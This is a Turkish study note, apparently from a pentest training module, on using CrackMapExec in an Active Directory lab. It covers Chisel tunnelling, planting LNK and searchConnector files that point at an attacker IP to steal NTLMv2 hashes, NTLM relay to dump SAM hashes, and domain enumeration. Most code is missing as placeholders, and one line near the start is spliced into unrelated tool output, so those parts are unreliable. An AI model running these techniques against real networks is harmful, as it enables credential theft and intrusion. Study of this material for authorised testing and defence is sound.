+![Pasted image 20241203155109.png](/img/user/resimler/Pasted%20image%2020241203155109.png)
+
+![Pasted image 20241203155117.png](/img/user/resimler/Pasted%20image%2020241203155117.png)
+
+
+### Share Information
+
+CME veritabanı da belirlediğimiz paylaşımlı klasörleri saklıyor ve okuma ve yazma erişimine sahip kullanıcılarımız olup olmadığını bize söylüyor. Paylaşım bilgilerine erişmek için cmedb içerisinde SMB protokolü içerisinde shares seçeneğini kullanmamız gerekiyor.
+
+### Paylaşımları Geri Alma
+
+![Pasted image 20241203155153.png](/img/user/resimler/Pasted%20image%2020241203155153.png)
+
+
+### Kullanıcı Ekleme ve Kaldırma
+CME, kullanıcıları veritabanından manuel olarak ekleme veya kaldırma özelliğini destekler. Protokolü (SMB veya MSSQL) seçiyoruz ve creds add veya creds remove kullanıyoruz.
+
+
+### cmedb'ye Kullanıcı Ekleme
+
+![Pasted image 20241203155239.png](/img/user/resimler/Pasted%20image%2020241203155239.png)
+Şimdi eklediğimiz kullanıcıyı kaldırmayı deneyebiliriz.
+
+
+### Bir Kullanıcıyı cmedb'den Kaldırma
+
+![Pasted image 20241203155300.png](/img/user/resimler/Pasted%20image%2020241203155300.png)
+
+![Pasted image 20241203155318.png](/img/user/resimler/Pasted%20image%2020241203155318.png)
+
+
+### Empire Kimlik Bilgilerini İçe Aktarma
+cmedb'nin sahip olduğu bir başka özellik de Empire'dan kimlik bilgilerini içe aktarma yeteneğidir.
+
+
+### Import from Empire
+
+![Pasted image 20241203155352.png](/img/user/resimler/Pasted%20image%2020241203155352.png)
+
+Not: Bu özelliği kullanmak istiyorsanız Empire'ı yapılandırdığınızdan emin olun
+
+### Export cmedb Data
+
+CrackMapExec veritabanından kimlik bilgilerini, hostları, local adminleri ve paylaşımları dışarı aktarabiliriz
+
+
+### Kimlik Bilgilerini cmedb'den Dışa Aktarma
+
+![Pasted image 20241203155453.png](/img/user/resimler/Pasted%20image%2020241203155453.png)
+
+![Pasted image 20241203155458.png](/img/user/resimler/Pasted%20image%2020241203155458.png)
+
+Veriler CSV dosyası olarak dışa aktarılır. LibreOffice veya Excel gibi araçları kullanarak açabiliriz.
+
+![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)
+
+
+
+### skill 
+
+CrackMapExec aracı hakkında derinlemesine bir eğitim kursu aldıktan sonra ilk Dahili Sızma Testinizi gerçekleştiren bir Sızma Test Uzmanısınız. Müşteriniz INLANEFREIGHT CORP, Active Directory ortamını değerlendirmek için firmanızı işe aldı. İlk göreviniz geçerli bir hesap bulmak ve farklı protokoller kullanarak ortak bir parola denemek. Müşteriniz herhangi bir kesinti süresini göze alamaz, bu nedenle herhangi bir hesabı kilitlememeye dikkat etmeniz gerekir. Geçerli bir hesap bulduğunuzda, diğer hesapları ele geçirmenize yardımcı olacak ilginç bilgileri bulmak için numaralandırın, numaralandırın, numaralandırın. Unutmayın, amacınız alan yöneticisi erişimi elde edene kadar mümkün olduğunca çok hesabı ele geçirmektir. Amacınız hedef etki alanını ele geçirmek ve NTDS dosyasının içeriğini elde etmektir. Bu modülü dikkatle takip ettiyseniz, uzun sürmeyecektir.
+
+
+### Hedef ortama bağlanma adımları
+
+Uzaktan dahili bir sızma testi yapıyorsunuz, bu nedenle önce VPN'e bağlanmanız ve oradan 172.16.15.0/24 hedef ağına dahili numaralandırma yapmanız gerekecek. Dahili şirket ağına bağlanmak için aşağıdaki gibi Chisel ve proxyychains kullanmanız gerekecektir:
+
+
+### Connecting to the Internal Network VPN
+
+![Pasted image 20241203155738.png](/img/user/resimler/Pasted%20image%2020241203155738.png)
+![Pasted image 20241203155743.png](/img/user/resimler/Pasted%20image%2020241203155743.png)
+
+Chisel ile kullanmayı seçtiğiniz bağlantı noktasıyla eşleşmesi için /etc/proxychains.conf dosyasını değiştirmeyi unutmayın.
+
+Hedef sistemi başlattığınızda, 10.129.204.182 örnek IP'sini hedef IP'nizle değiştirin.
+
+Dahili ağı numaralandırmak için şu komutu kullanabilirsiniz: 
+proxychains crackmapexec [protocol] [target] CME ile Proxychains bölümünde gösterildiği gibi., 'netlogon', 'sysvol']
+SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
+['ico', 'lnk']
+SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
+SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
+/tmp/cme_spider_plus
+```
+
+Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:
+
+
+### Kullanıcının Kullanabileceği Dosyaları Listeleme
+
+{{CODE_BLOCK_94}}
+
+Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:
+
+{{CODE_BLOCK_95}}
+
+{{CODE_BLOCK_96}}
+
+Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir
+
+`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:
+
+
+### Spider_plus Options
+
+{{CODE_BLOCK_97}}
+
+Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.
+
+
+---
+
+
+### Proxychains with CME
+
+### Scenario
+
+İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:
+
+![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)
+
+DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.
+
+
+### Set Up the Tunnel
+
+Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:
+
+*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:
+
+### Chisel - Reverse Tunnel
+
+{{CODE_BLOCK_98}}
+
+
+*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:
+
+
+### Upload Chisel
+
+{{CODE_BLOCK_99}}
+
+
+* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)
+
+
+### Connect to the Chisel Server
+
+{{CODE_BLOCK_100}}
+
+Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.
+
+**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.
+
+### Chisel Receiving Session No. 1
+
+{{CODE_BLOCK_101}}
+
+TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:
+
+
+### Check Listening Port
+
+{{CODE_BLOCK_102}}
+
+* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:
+
+
+### Configure Proxychains
+
+{{CODE_BLOCK_103}}
+
+* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:
+
+### CrackMapExec'in Proxychains ile Test Edilmesi
+
+{{CODE_BLOCK_104}}
+
+
+Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:
+
+### Quiet Seçeneği ile Proxychains4
+
+{{CODE_BLOCK_105}}
+
+Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.
+
+
+### Killing Chisel on the Target Machine
+
+İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.
+
+
+### Kill the Chisel Client
+
+{{CODE_BLOCK_106}}
+
+Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:
+
+
+### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması
+
+{{CODE_BLOCK_107}}
+
+Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.
+
+
+### Attack Host Üzerinde Chisel'i Kapatma
+
+{{CODE_BLOCK_108}}
+
+
+### Sunucu olarak Windows ve Client olarak Linux
+
+Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.
+
+
+### Chisel'i Hedef Makinede Sunucu Olarak Başlatma
+
+{{CODE_BLOCK_109}}
+
+Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.
+
+
+### Attack Hostumuzdan Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_110}}
+
+Şimdi Proxychains'i tekrar kullanabiliriz:
+
+### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma
+
+{{CODE_BLOCK_111}}
+
+Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.
+
+İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.
+
+---
+
+### Stealing Hashes
+
+Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.
+
+Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.
+
+Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.
+
+NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.
+
+
+### Slinky Modülü
+
+`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.
+
+Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.
+
+
+### Slinky Module Options
+
+{{CODE_BLOCK_112}}
+
+`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.
+
+
+### Chisel kullanarak bağlama
+
+Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**
+
+
+### Hedef Makine Chisel Sunucusuna Bağlanma
+
+{{CODE_BLOCK_113}}
+
+
+### NTLMv2 Hash'lerinin Çalınması
+İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:
+
+### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma
+
+{{CODE_BLOCK_114}}
+
+
+Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 
+
+**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.
+
+
+### Using Slinky
+
+{{CODE_BLOCK_115}}
+
+
+![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)
+
+**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.
+
+Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.
+
+LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 
+
+
+### Starting Responder
+
+{{CODE_BLOCK_116}}
+
+Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.
+
+NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.
+
+
+### **NTLM Relay**
+
+Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.
+
+Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz
+
+### Getting Relay List
+
+{{CODE_BLOCK_117}}
+
+
+**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.
+
+Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.
+
+### Execute NTLMRelayX
+
+{{CODE_BLOCK_118}}
+
+Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).
+
+Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:
+
+{{CODE_BLOCK_119}}
+
+Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:
+
+### Local Hesapları Test Etme
+
+{{CODE_BLOCK_120}}
+
+### Her Şeyi Temizleyin
+
+Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.
+
+### Cleanup
+
+{{CODE_BLOCK_121}}
+
+### drop-sc Modülü ile Hash'lerin Çalınması
+Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
+
+Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+
+CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+
+İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
+
+* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+
+* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+
+* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+
+Drop-sc'yi iş başında görelim:
+
+
+### Dropping a searchConnector-ms File
+
+![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+
+![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+
+Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+
+
+### NTLMRelayx ve drop-sc Kullanarak Aktarma
+
+![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
+![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
+
+Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+
+
+### searchConnector-ms Dosyalarını Temizleme
+![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
+![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
+
+LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+
+### SMB ile Eşleme ve Numaralandırma
+
+CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
+
+![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
+![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+
+Daha önce çalışmamış olanları gözden geçirelim:
+
+### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+
+Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+
+
+### Sessions ve loggendon-users seçeneklerini kullanma
+![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
+
+Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+
+
+### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
+![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
+![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+
+### Enumerate Computers
+
+CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
+
+
+### Domain'deki Bilgisayarları Numaralandırma
+![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
+
+
+### Enumerate LAPS
+
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+
+![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
+
+![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+
+![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
+
+Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
+
+
+### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
+
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+
+
+### List Local Users
+
+![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
+![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
+![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
+![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
+![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+
+Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+
+rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
+
+
+### Enumerate Disks
+
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+
+### Enumerating Disks
+![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+
+### Local ve Domain Gruplarını Numaralandırma
+Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+### Enumerating Local Groups
+![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
+![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
+
+
+### Enumerating Domain Groups
+![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
+![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
+
+Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+
+
+### Group **Members**
+![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
+
+Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+
+
+### Querying WMI
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+
+Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+
+WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+
+
+### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
+![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
+
+WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+
+
+### Quering root\WMI Namespace
+![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
+![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
+
+Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+
+Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
+
+
+### LDAP and RDP Enumeration
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
+
+
+### LDAP & RDP Commands
+LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
+![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
+![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
+
+Henüz çalışmadıklarımızı gözden geçirelim.
+
+
+### Enumerating Users and Groups
+
